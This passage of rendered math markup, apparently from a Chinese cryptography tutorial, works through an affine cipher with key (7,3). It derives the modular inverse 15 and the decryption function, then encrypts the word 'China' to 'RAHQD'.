separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k = (k_1, k_2) = (7, 3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>，用仿射密码对其进行加密，然后再进行解密。</p><p>利用扩展欧几里得算法求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mn>1</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo>=</mo><msub><mn>7</mn><mrow><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mn>15</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k_1^{-1}=7_{-1}=15(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.120547em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.433692em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.852771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord">7</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>，加密函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>7</mn><mo>×</mo><mi>p</mi><mo>+</mo><mn>3</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_k(p)=7\times p+3(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>，对应的解密函数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mn>15</mn><mo>×</mo><mo stretchy="false">(</mo><mi>c</mi><mo>−</mo><mn>3</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mo>=</mo><mn>15</mn><mi>c</mi><mo>−</mo><mn>19</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D_k(c)=15\times (c-3)(\bmod26)=15c-19(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>。</p><p>明文消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">China</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span></span></span></span>对应的数字序列为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>13</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(2,7,8,13,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>，用仿射密码对明文进行加密：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>7</mn><mo>×</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>13</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>17</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>52</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>59</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>94</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>17</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>16</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>R</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>A</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>H</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>Q</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>D</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">c=E_{k}(p)=7 \times\left[\begin{array}{c}2 \\7 \\8 \\13 \\0\end{array}\right]+\left[\begin{array}{l}3 \\3 \\3 \\3 \\3\end{array}\right]=\left[\begin{array}{c}17 \\52 \\59 \\94 \\3\end{array}\right] \bmod 26=\left[\begin{array}{c}17 \\0 \\7 \\16 \\3\end{array}\right]=\left[\begin{array}{c}R \\A \\H \\Q \\D\end{array}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">3</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">7</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span><span class="mord">2</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span><span class="mord">9</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">9</span><span class="mord">4</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span 